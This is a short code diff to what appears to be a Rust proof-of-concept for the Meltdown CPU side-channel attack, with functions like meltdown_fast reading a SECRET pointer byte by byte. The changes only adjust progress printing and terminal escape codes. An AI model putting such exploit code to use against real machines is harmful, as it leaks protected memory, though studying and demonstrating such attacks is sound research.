@@ -155,8 +155,7 @@ pub fn handle_signal() {
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
 	for iteration in 0..config.retries {
-		let iteration_num_digits = iteration.checked_ilog10().unwrap_or(0) + 1;
-		print!("  {}{}", iteration, "\x1b[1D".repeat(iteration_num_digits as usize + 2));
+		print!("  {}\x1b[1D\x1b[1D\x1b[1D", iteration / 1000);
 		unsafe {
 			if setjmp(&mut *jump_buf.lock()) == 0 {
 				meltdown_fast(mem, pointer);
@@ -358,7 +357,7 @@ pub fn main() {
 			pointer = SECRET.add(index);
 		}
 		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
-		print!("{}        \x1b[1D\x1b[1D\x1b[1D\x1b[1D\x1b[1D\x1b[1D\x1b[1D", value as u8 as char); // Clear 7 characters right of the cursor (1 space, 'c' for interrupt information, up to 5 digits of iteration count
+		print!("{}", value as u8 as char); // Clear 7 characters right of the cursor (1 space, 'c' for interrupt information, up to 5 digits of iteration count
 		/*unsafe {
 			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
 		}*/
